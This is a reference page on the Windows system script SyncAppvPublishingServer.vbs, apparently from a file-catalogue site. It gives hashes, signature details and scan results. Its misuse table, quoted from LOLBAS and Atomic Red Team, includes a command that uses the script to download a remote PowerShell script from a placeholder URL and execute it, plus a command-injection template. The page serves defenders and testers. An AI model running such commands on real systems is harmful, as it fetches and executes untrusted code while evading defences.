---
title: SyncAppvPublishingServer.vbs | 
excerpt: What is SyncAppvPublishingServer.vbs?
---

# SyncAppvPublishingServer.vbs 

* File Path: `C:\Windows\system32\SyncAppvPublishingServer.vbs`

## Hashes

Type | Hash
-- | --
MD5 | `20C4FE2B130D9F0C92D7629E71AFBB66`
SHA1 | `F01DE532969553083CF7906B2709940F0A41B083`
SHA256 | `B8A5C42BF6F7A14BA73660BE29F5C061D30B41C6D14E42B880A4EA522F43CE66`
SHA384 | `CDE0071B663777802DC59D894F7D542F2595EF14E1879780791FD3C64C30FC3FA892C8E509A91E1DD9EE84B1AC40C34C`
SHA512 | `28A9A72CBD9D8273ABB6E7B6397BA73ADD84E86EA7C5C06E75C3139FC120A4C165E7B37BBA3B3858BB2E3CF2261734EB947BFEB1CC7319F3EB22ECD3B2A60A53`
SSDEEP | `24:oDJ0iM9D6opZ9HP20c3AreKJvV164bhTbXGV+oWE/N8IwdeLVcHH8o:oDupD6uLHO0gAreKJvf669Cn/NEdemnB`
PESHA1 | `F01DE532969553083CF7906B2709940F0A41B083`
PE256 | `B8A5C42BF6F7A14BA73660BE29F5C061D30B41C6D14E42B880A4EA522F43CE66`

## Runtime Data

### Child Processes:
powershell.exe

### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\cscript.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: 
* Product Name: 
* Company Name: 
* File Version: 
* Product Version: 
* Language: 
* Legal Copyright: 

## File Scan

* VirusTotal Detections: 0/75
* VirusTotal Link: https://www.virustotal.com/gui/file/b8a5c42bf6f7a14ba73660be29f5c061d30b41c6d14e42b880a4ea522f43ce66/detection


## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.vbs` being misused. While `SyncAppvPublishingServer.vbs` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


